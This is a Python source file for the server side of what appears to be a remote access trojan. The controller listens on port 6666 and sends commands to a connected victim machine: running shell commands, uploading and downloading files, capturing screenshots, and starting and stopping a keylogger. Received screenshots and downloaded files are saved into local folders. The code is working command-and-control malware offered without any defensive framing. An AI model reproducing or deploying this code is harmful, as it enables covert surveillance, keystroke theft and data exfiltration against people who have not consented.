import os
import socket
import time
from datetime import datetime


def send_file(file):
    print(file)
    try:
        tosend_file = open(file.strip(), 'rb')
        client_socket.send(command.encode())
        Filetosend = tosend_file.read(1000000000)
        tosend_file.close()
        client_socket.send(Filetosend)
        print("Sucessfully Uploaded")
    except Exception as e:
        print(e)
        print("File Not Found")


def cls():
    os.system('cls' if os.name == 'nt' else 'clear')


if os.path.exists("screenshots"):
    pass
else:
    os.mkdir("screenshots")
if os.path.exists("downloads"):
    pass
else:
    os.mkdir("downloads")
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 6666
BUFFER_SIZE = 1024

while True:
    cls()
    # create a socket object
    s = socket.socket()

    # bind the socket to all IP addresses of this host
    s.bind((SERVER_HOST, SERVER_PORT))
    # make the PORT reusablec
    # when you run the server multiple times in Linux, Address already in use error will raise
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen(5)
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

    # accept any connections attempted
    client_socket, client_address = s.accept()
    print(f"{client_address[0]}:{client_address[1]} Connected!")

    # just sending a message, for demonstration purposes
    message = "Connected".encode()
    client_socket.send(message)
    while True:
        time.sleep(1)
        try:
            # get the command from prompt
            command = input("Enter the command you wanna execute:")
            # send the command to the client

            if command.lower() == "exit":
                client_socket.send(command.encode())
                # if the command is exit, just break out of the loop
                break
            elif command == "screenshot":
                client_socket.send(command.encode())
                try:
                    dt_string = datetime.now().strftime("%d-%m-%Y %H-%M-%S")
                    path = f"screenshots/{dt_string}.png"
                    recv_file = open(path, 'wb')
                    FILETORECV = client_socket.recv(10000000)
                    recv_file.write(FILETORECV)
                    recv_file.close()
                    print("File Saved In " + path)
                except Exception as e:
                    print(e)
            elif command.lower()[:8] == "download":
                client_socket.send(command.encode())
                try:

                    FILETORECV = client_socket.recv(1000000000)
                    if "Error" == FILETORECV.decode():
                        raise Exception("File not found")
                    recv_file = open(f"downloads/{command.strip()[8:]}", 'wb')
                    recv_file.write(FILETORECV)
                    recv_file.close()
                    print("File Saved In " + "downloads")
                except Exception as e:
                    print(e)
                    pass
            elif command.lower()[:6] == "upload":
                send_file(command.lower()[6:].strip())

            # retrieve command results
            elif command.lower() == "help":
                print("Following are the commands:-")
                print("1. run [cmd_command]")
                print("2. upload [filename]")
                print("3. download [filename]")
                print("4. screenshot")
                print("5. start_keylogger")
                print("6. stop_keylogger")
                print("7. clear")
                print("8. exit")
            elif command.lower() == "clear":
                cls()
            else:
                client_socket.send(command.encode())
                results = client_socket.recv(BUFFER_SIZE).decode()
                print(results)
        except Exception as e:
            cls()
            print(e)
            print("Client has been disconnected. Looking for a new connection")

            break
    # close connection to the client
    client_socket.close()
    # close server connection
    s.close()
